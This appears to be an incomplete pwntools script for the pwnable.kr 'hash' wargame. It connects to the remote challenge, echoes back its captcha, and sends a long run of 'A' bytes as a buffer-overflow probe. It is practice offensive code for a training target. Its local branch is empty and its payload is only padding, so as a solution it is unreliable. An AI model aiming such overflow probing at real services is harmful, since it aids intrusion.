from pwn import * 
import base64

context.binary = elf = ELF('./hash') 
context.log_level = 'DEBUG' 

if args['local']:
    pass
else:
    io = remote('pwnable.kr', 9002) 


io.recvuntil(b'captcha : ')
number = io.recvuntil('\n').decode().strip()
io.sendline(number.encode())
io.sendline(b'A' * 0x400)
io.interactive()


